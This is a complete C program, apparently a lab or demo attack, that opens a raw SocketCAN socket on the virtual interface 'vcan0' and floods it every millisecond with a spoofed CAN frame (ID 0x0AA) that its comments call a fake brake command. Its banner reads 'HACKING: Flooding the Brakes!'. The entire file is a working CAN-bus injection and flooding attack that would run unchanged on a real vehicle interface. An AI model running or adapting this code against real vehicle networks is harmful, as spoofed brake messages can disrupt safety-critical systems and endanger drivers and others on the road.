#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

int main() {
    int s; struct sockaddr_can addr; struct ifreq ifr; struct can_frame frame;
    s = socket(PF_CAN, SOCK_RAW, CAN_RAW);
    strcpy(ifr.ifr_name, "vcan0"); ioctl(s, SIOCGIFINDEX, &ifr);
    addr.can_family = AF_CAN; addr.can_ifindex = ifr.ifr_ifindex;
    bind(s, (struct sockaddr *)&addr, sizeof(addr));

    printf("HACKING: Flooding the Brakes!\n");
    while(1) {
        // Send Fake Brake Command (0x0AA)
        frame.can_id = 0x0AA; frame.can_dlc = 1; frame.data[0] = 1; 
        write(s, &frame, sizeof(struct can_frame));
        
        usleep(1000); // Spam it super fast (every 1 millisecond)
    }
    return 0;
}
